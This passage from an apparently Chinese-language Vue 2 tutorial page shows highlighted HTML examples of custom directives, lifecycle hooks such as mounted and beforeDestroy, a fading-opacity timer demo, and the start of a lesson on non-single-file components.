class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        1.需求1：定义一个v-big指令，与v-text指令类似，但会把绑定的数值放大10倍。</span></span><br><span class="line"><span class="comment">        2.需求2：定义一个v-fbind指令，与v-bind指令类似，但可以让其所绑定的input元素默认获取焦点。</span></span><br><span class="line"><span class="comment">        自定义指令总结：</span></span><br><span class="line"><span class="comment">            一、定义语法：</span></span><br><span class="line"><span class="comment">                1.局部指令：</span></span><br><span class="line"><span class="comment">                    new Vue(&#123;                                       new Vue(&#123;</span></span><br><span class="line"><span class="comment">                        directives:&#123;指令名:配置对象&#125;     或              directives()&#123;&#125;</span></span><br><span class="line"><span class="comment">                    &#125;)                                              &#125;)</span></span><br><span class="line"><span class="comment">                2.全局指令：</span></span><br><span class="line"><span class="comment">                    Vue.directive(&#x27;指令名&#x27;,配置对象)     或          Vue.directive(&#x27;指令名&#x27;,回调函数) </span></span><br><span class="line"><span class="comment">            二、配置对象中常用的三个回调：</span></span><br><span class="line"><span class="comment">                1.bind(element,binding)：指令与元素成功绑定时被调用</span></span><br><span class="line"><span class="comment">                2.inserted(element,binding)：指令所在元素被插入页面时被调用</span></span><br><span class="line"><span class="comment">                3.update(element,binding)：指令所在的模板被重新解析时被调用</span></span><br><span class="line"><span class="comment">            三、备注：</span></span><br><span class="line"><span class="comment">                1.指令定义时不加v-，但使用时要加v-前缀；</span></span><br><span class="line"><span class="comment">                2.指令名如果是多个单词时，要使用kebab-case命名方式，不要使用camelCase命名；</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是：<span class="tag">&lt;<span class="name">span</span> <span class="attr">v-text</span>=<span class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;h2&gt;放大10倍的n值是：&lt;span v-big-number=&quot;n&quot;&gt;&lt;/span&gt;&lt;/h2&gt; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>放大10倍的n值是：<span class="tag">&lt;<span class="name">span</span> <span class="attr">v-big</span>=<span class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-fbind:value</span>=<span class="string">&quot;n&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root2&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 使用全局指令 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-fbind:value</span>=<span class="string">&quot;n&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//定义全局指令</span></span></span><br><span class="line"><span class="javascript">    Vue.directive(<span class="string">&#x27;fbind&#x27;</span>,&#123;</span></span><br><span class="line"><span class="javascript">         <span class="comment">//指令与元素成功绑定时被调用</span></span></span><br><span class="line"><span class="javascript">         <span class="function"><span class="title">bind</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;bind&#x27;</span>)</span></span><br><span class="line">            element.value = binding.value</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//指令所在元素被插入页面时被调用</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">inserted</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;inserted&#x27;</span>)</span></span><br><span class="line">            element.focus()</span><br><span class="line">        &#125;,        </span><br><span class="line"><span class="javascript">        <span class="comment">//指令所在的模板被重新解析时被调用</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">update</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;update&#x27;</span>)</span></span><br><span class="line">            element.value = binding.value</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            n:1,</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//定义局部指令</span></span></span><br><span class="line">        directives:&#123;</span><br><span class="line"><span class="javascript">            <span class="comment">//函数式（普通写法）</span></span></span><br><span class="line">            /**</span><br><span class="line"><span class="javascript">            <span class="string">&#x27;big-number&#x27;</span>:<span class="function"><span class="keyword">function</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//    console.log(element,binding.value) //element是真实DOM标签，binding是真实DOM标签的属性对象</span></span></span><br><span class="line"><span class="javascript">                element.innerText = binding.value * <span class="number">10</span> <span class="comment">//将绑定的值乘以10放入DOM中</span></span></span><br><span class="line">            &#125;,</span><br><span class="line">            */</span><br><span class="line"><span class="javascript">            <span class="comment">//函数式（简写）</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//big函数何时被调用？1.指令与元素成功绑定时。2.指令所在的模板被重新解析时。</span></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">big</span>(<span class="params">element,binding</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//    console.log(element,binding.value) //element是真实DOM标签，binding是真实DOM标签的属性对象</span></span></span><br><span class="line"><span class="javascript">                element.innerText = binding.value * <span class="number">10</span> <span class="comment">//将绑定的值乘以10放入DOM中</span></span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            <span class="comment">//对象式式指令</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// fbind:&#123;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     //指令与元素成功绑定时被调用</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     bind(element,binding)&#123;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         console.log(&#x27;bind&#x27;)</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         element.value = binding.value</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     &#125;,</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     //指令所在元素被插入页面时被调用</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     inserted(element,binding)&#123;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         console.log(&#x27;inserted&#x27;)</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         element.focus()</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     &#125;,</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     //指令所在的模板被重新解析时被调用</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     update(element,binding)&#123;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         console.log(&#x27;update&#x27;)</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//         element.value = binding.value</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//     &#125;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// &#125;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root2&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            n:5,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="39-引出Vue生命周期"><a href="#39-引出Vue生命周期" class="headerlink" title="39.引出Vue生命周期"></a>39.引出Vue生命周期</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>引出Vue生命周期<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        生命周期：</span></span><br><span class="line"><span class="comment">            1.又名：生命周期回调函数、生命周期函数、生命周期钩子；</span></span><br><span class="line"><span class="comment">            2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数；</span></span><br><span class="line"><span class="comment">            3.生命周期函数的名字不可更改，但函数体的内容是程序员根据需求编写的；</span></span><br><span class="line"><span class="comment">            4.生命周期函数的this指向的是 vm 或 组件实例对象；</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 绑定style样式 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;h2 :style=&quot;&#123;opacity: opacity&#125;&quot;&gt;欢迎学习Vue&lt;/h2&gt; --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 重名可以简写 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;opacity&#125;&quot;</span>&gt;</span>欢迎学习Vue<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line">   </span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            opacity: 1, </span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            </span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//Vue完成模板解析并把初始的真实DOM元素放入页面后（这个过程称为完成挂载）调用mounted()函数（只调用一次）</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;mounted&#x27;</span>)</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 设置定时器(推荐)</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span>(<span class="built_in">this</span>.opacity &lt;= <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">this</span>.opacity = <span class="number">1</span></span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.opacity -= <span class="number">0.01</span></span></span><br><span class="line">            &#125;,15)</span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 设置定时器(通过外部定时器实现，不推荐)</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// setInterval(()=&gt;&#123;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     if(vm.opacity &lt;= 0)&#123;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//         vm.opacity = 1</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     &#125;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//     vm.opacity -= 0.01</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// &#125;,20)</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="40-分析Vue生命周期"><a href="#40-分析Vue生命周期" class="headerlink" title="40.分析Vue生命周期"></a>40.分析Vue生命周期</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>分析Vue生命周期<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是：&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;add&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;bye&quot;</span>&gt;</span>点我销毁vm<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line">   </span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">           n: 1, </span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">add</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.n++</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">bye</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;bye&#x27;</span>)</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.$destroy()<span class="comment">//销毁Vue实例</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">beforeCreate</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 此时无法通过vm访问到data中的数据和methods中的方法。</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;beforeCreate&#x27;</span>)</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">created</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">             <span class="comment">// 此时可以通过vm访问到data中的数据和methods中配置的方法。</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;created&#x27;</span>)</span></span><br><span class="line"><span class="javascript">            <span class="comment">// console.log(this)</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// 调试断点</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// debugger</span></span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">beforeMount</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 此时页面呈现的是未经Vue编译的DOM结构，所有对DOM的操作最终都不奏效。</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;beforeMount&#x27;</span>)</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//Vue完成模板解析并把初始的真实DOM元素放入页面后（这个过程称为完成挂载）调用mounted()函数（只调用一次）</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">             <span class="comment">// 此时页面呈现的是经Vue编译过的DOM结构，所有对DOM的操作均奏效（尽可能避免）。</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//  至此初始化过程结束，一般在此进行：开启定时器、发送网络请求、订阅消息、绑定自定义事件等初始化操作。</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;mounted&#x27;</span>)</span></span><br><span class="line">            </span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">beforeUpdate</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 此时数据是新的，但页面是旧的。即：页面尚未和数据保持同步。</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;beforeUpdate&#x27;</span>)</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">updated</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">             <span class="comment">// 此时数据是新的，页面也是新的。即：页面和数据保持同步。</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;updated&#x27;</span>)</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">beforeDestroy</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 此时vm中所有的data、methods、指令等等，都处于可用状态，马上要执行销毁过程。</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">// 一般在此进行：关闭定时器、取消消息订阅、解绑自定义事件等收尾操作。</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;beforeDestroy&#x27;</span>)</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">destroyed</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;destroyed&#x27;</span>)</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="41-总结Vue生命周期"><a href="#41-总结Vue生命周期" class="headerlink" title="41.总结Vue生命周期"></a>41.总结Vue生命周期</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>总结Vue生命周期<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        常用的生命周期钩子：</span></span><br><span class="line"><span class="comment">            1.mounted：开启定时器、发送ajax请求、订阅消息、绑定自定义事件等初始化操作。</span></span><br><span class="line"><span class="comment">            2.beforeDestroy：清除定时器、取消消息订阅、解绑自定义事件等收尾操作。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        关于销毁Vue实例：</span></span><br><span class="line"><span class="comment">            1.销毁后借助Vue开发者工具看不到任何信息；</span></span><br><span class="line"><span class="comment">            2.销毁后自定义事件会失效，但原生DOM事件任然有效；</span></span><br><span class="line"><span class="comment">            3.一般不会在beforeDestroy里操作数据，因为即便操作数据，也不会再触发更新流程了；</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;opacity&#125;&quot;</span>&gt;</span>欢迎学习Vue<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;stop()&quot;</span>&gt;</span>点我终止变换<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line">   </span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line">            opacity: 1, </span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">stop</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.$destroy()<span class="comment">//模拟vm被销毁，调用beforeDestroy()生命周期函数，做一些善后工作，比如：清除定时器等</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//Vue完成模板解析并把初始的真实DOM元素放入页面后（这个过程称为完成挂载）调用mounted()函数（只调用一次）</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;mounted&#x27;</span>)</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 设置定时器,并将定时器id赋值给vm的timer属性</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">this</span>.timer = <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span>(<span class="built_in">this</span>.opacity &lt;= <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">this</span>.opacity = <span class="number">1</span></span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.opacity -= <span class="number">0.01</span></span></span><br><span class="line">            &#125;,15)</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">beforeDestroy</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;beforeDestroy做一些善后工作&#x27;</span>)</span></span><br><span class="line"><span class="javascript">            <span class="built_in">clearInterval</span>(<span class="built_in">this</span>.timer)<span class="comment">//清除指定id定时器</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="42-非单文件组件（基本使用）"><a href="#42-非单文件组件（基本使用）" class="headerlink" title="42.非单文件组件（基本使用）"></a>42.非单文件组件（基本使用）</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>非单文件组件（基本使用）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">        Vue中使用组件的三大步骤：</span></span><br><span class="line"><span class="comment">            1.定义组件（创建组件）</span></span><br><span class="line"><span class="comment">            2.注册组件</span></span><br><span class="line"><span class="comment">            3.使用组件（写组件标签）</span></span><br><span class="line"><span class="comment">        一、如何定义一个组件？</span></span><br><span class="line"><span class="comment">            使用Vue.extend(options)创建，其中options和new Vue(options)时传入的options几乎一样，</span></span><br><span class="line"><span class="comment">            但区别如下：</span></span><br><span class="line"><span class="comment">                1.el不要写，为什么？——最终所有的组件都要经过一个vm管理，由vm中的el决定组件服务于那个容器。</span></span><br><span class="line"><span class="comment">                2.data必须写成函数，为什么？——避免组件被复用时，数据存在引用关系。</span></span><br><span class="line"><span class="comment">                备注：使用template可以配置组件结构；</span></span><br><span class="line"><span class="comment">        二、如何注册组件？</span></span><br><span class="line"><span class="comment">            1.全局注册：靠new Vue()的时候传入components选项；</span></span><br><span class="line"><span class="comment">            2.局部注册：靠Vue.component(&#x27;组件名&#x27;，组件)；</span></span><br><span class="line"><span class="comment">        三、编写组件标签：</span></span><br><span class="line"><span class="comment">            &lt;school&gt;&lt;/school&gt;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span 